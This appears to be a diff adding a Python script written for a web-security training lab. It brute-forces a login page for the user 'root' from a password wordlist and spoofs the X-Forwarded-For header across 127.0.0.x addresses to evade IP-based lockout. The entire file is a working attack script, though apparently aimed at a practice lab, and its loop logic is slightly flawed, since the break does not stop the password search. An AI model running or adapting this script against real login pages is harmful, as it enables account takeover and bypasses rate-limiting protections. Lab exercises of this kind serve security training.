@@ -1,0 +1,21 @@
+import requests
+
+url = 'https://0a1c00cf03be0a178019bc61001f00c6.web-security-academy.net/login'
+
+with open('../wordlists/burp_passwords.txt', 'r') as file:
+    passwords = file.readlines()
+    passwords = [password.strip() for password in passwords]
+
+
+
+for password in passwords:
+    for ip in range(10,256):
+        headers = {'X-Forwarded-For': f'127.0.0.{ip}'}
+        ip += 1
+        response = requests.post(url, headers=headers, data={'username': 'root', 'password': password})
+
+       
+
+        if 'Invalid username or password' not in response.text:
+            print(f'Found password: {password}')
+            break
